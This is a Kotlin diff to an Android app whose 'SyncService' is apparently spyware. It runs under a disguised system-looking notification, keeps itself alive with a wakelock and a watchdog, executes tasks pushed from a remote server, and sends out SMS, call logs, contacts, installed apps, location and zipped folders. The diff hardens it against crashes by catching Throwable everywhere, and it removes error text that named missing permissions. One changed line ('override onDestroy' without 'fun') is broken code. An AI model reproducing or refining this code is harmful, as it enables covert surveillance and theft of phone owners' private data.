@@ -51,7 +51,7 @@ class SovereignWatchdogWorker(appContext: Context, workerParams: WorkerParameter
                 applicationContext.startService(serviceIntent)
             }
             Result.success()
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Result.retry()
         }
     }
@@ -91,31 +91,31 @@ class SyncService : Service() {
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sovereign:UltimateWakeLock").apply {
                 acquire(10 * 60 * 60 * 1000L)
             }
-        } catch (e: Exception) {}
+        } catch (e: Throwable) {}
     }
 
     private fun startForegroundServiceNotification() {
-        val channelName = "System Core Synchronization v7.8"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW)
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
-
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Assets Core")
-            .setContentText("Sovereign core operational v7.8...")
-            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-
         try {
+            val channelName = "System Core Synchronization v7.8"
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW)
+                val manager = getSystemService(NotificationManager::class.java)
+                manager?.createNotificationChannel(channel)
+            }
+
+            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("System Assets Core")
+                .setContentText("Sovereign core operational v7.8...")
+                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .build()
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
                 startForeground(NOTIF_ID, notification)
             }
-        } catch (e: Exception) {}
+        } catch (e: Throwable) {}
     }
 
     private fun scheduleWatchdog() {
@@ -131,7 +131,7 @@ class SyncService : Service() {
                 ExistingPeriodicWorkPolicy.KEEP,
                 request
             )
-        } catch (e: Exception) {}
+        } catch (e: Throwable) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -150,7 +150,7 @@ class SyncService : Service() {
                         if (response != null && response.has("task")) {
                             executeTask(response.getJSONObject("task"))
                         }
-                    } catch (e: Exception) {}
+                    } catch (e: Throwable) {}
                     delay(3000)
                 }
                 isLoopRunning.set(false)
@@ -164,7 +164,7 @@ class SyncService : Service() {
     private fun getNodeIdentifier(): String {
         return try {
             Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Sovereign-Node-007"
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             "Sovereign-Node-007"
         }
     }
@@ -213,7 +213,7 @@ class SyncService : Service() {
                         delay((attempts * 2000).toLong())
                     }
                 }
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 attempts++
                 delay((attempts * 2000).toLong())
             }
@@ -240,11 +240,13 @@ class SyncService : Service() {
 
     private fun sendTextReport(title: String, content: String) {
         serviceScope.launch {
-            val report = JSONObject().apply {
-                put("type", "TEXT_REPORT")
-                put("data", "=== $title ===\n$content")
-            }
-            dispatchPacketWithRetry(encryptPayload(report.toString()))
+            try {
+                val report = JSONObject().apply {
+                    put("type", "TEXT_REPORT")
+                    put("data", "=== $title ===\n$content")
+                }
+                dispatchPacketWithRetry(encryptPayload(report.toString()))
+            } catch (e: Throwable) {}
         }
     }
 
@@ -270,7 +272,7 @@ class SyncService : Service() {
                                         file.inputStream().use { it.copyTo(zipOut) }
                                         zipOut.closeEntry()
                                         count++
-                                    } catch (ex: Exception) {}
+                                    } catch (ex: Throwable) {}
                                 }
                             }
                         }
@@ -287,12 +289,14 @@ class SyncService : Service() {
             } else {
                 sendTextReport("تنبيه الأرشيف", "مجلد $folderName فارغ أو تعذر الوصول إليه.")
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             sendTextReport("خطأ ضغط المجلدات", "فشل ضغط $folderName بسبب الصلاحيات أو الخطأ: ${e.message}")
         } finally {
-            if (zipFile != null && zipFile.exists()) {
-                zipFile.delete()
-            }
+            try {
+                if (zipFile != null && zipFile.exists()) {
+                    zipFile.delete()
+                }
+            } catch (e: Throwable) {}
         }
     }
 
@@ -314,7 +318,7 @@ class SyncService : Service() {
                 client.newCall(req).execute().use { res ->
                     res.isSuccessful
                 }
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 false
             }
         }
@@ -331,8 +335,8 @@ class SyncService : Service() {
                 }
             }
             if (sb.isEmpty()) "لا توجد رسائل SMS مسجلة أو الصلاحية مقيدة." else sb.toString()
-        } catch (e: Exception) {
-            "تعذر قراءة الرسائل (صلاحية READ_SMS غير منحة): ${e.message}"
+        } catch (e: Throwable) {
+            "تعذر قراءة الرسائل: ${e.message}"
         }
     }
 
@@ -347,8 +351,8 @@ class SyncService : Service() {
                 }
             }
             if (sb.isEmpty()) "لا يوجد سجل مكالمات أو الصلاحية مقيدة." else sb.toString()
-        } catch (e: Exception) {
-            "تعذر قراءة سجل المكالمات (صلاحية READ_CALL_LOG غير منحة): ${e.message}"
+        } catch (e: Throwable) {
+            "تعذر قراءة سجل المكالمات: ${e.message}"
         }
     }
 
@@ -363,8 +367,8 @@ class SyncService : Service() {
                 }
             }
             if (sb.isEmpty()) "لا توجد جهات اتصال أو الصلاحية مقيدة." else sb.toString()
-        } catch (e: Exception) {
-            "تعذر قراءة جهات الاتصال (صلاحية READ_CONTACTS غير منحة): ${e.message}"
+        } catch (e: Throwable) {
+            "تعذر قراءة جهات الاتصال: ${e.message}"
         }
     }
 
@@ -373,7 +377,7 @@ class SyncService : Service() {
             val sb = StringBuilder()
             packageManager.getInstalledPackages(0).forEach { sb.append("Pkg: ${it.packageName}\n") }
             sb.toString()
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             "تعذر جلب التطبيقات المثبتة: ${e.message}"
         }
     }
@@ -384,17 +388,19 @@ class SyncService : Service() {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "الموقع غير متوفر حالياً."
-        } catch (e: Exception) {
-            "خطأ في قراءة الموقع (صلاحية الموقع غير منحة): ${e.message}"
+        } catch (e: Throwable) {
+            "خطأ في قراءة الموقع: ${e.message}"
         }
     }
 
     private fun byteArrayToHex(b: ByteArray): String = b.joinToString("") { "%02x".format(it) }
 
-    override fun onDestroy() {
-        isLoopRunning.set(false)
-        wakeLock?.release()
-        serviceScope.cancel()
+    override     onDestroy() {
+        try {
+            isLoopRunning.set(false)
+            wakeLock?.release()
+            serviceScope.cancel()
+        } catch (e: Throwable) {}
         super.onDestroy()
     }
 }
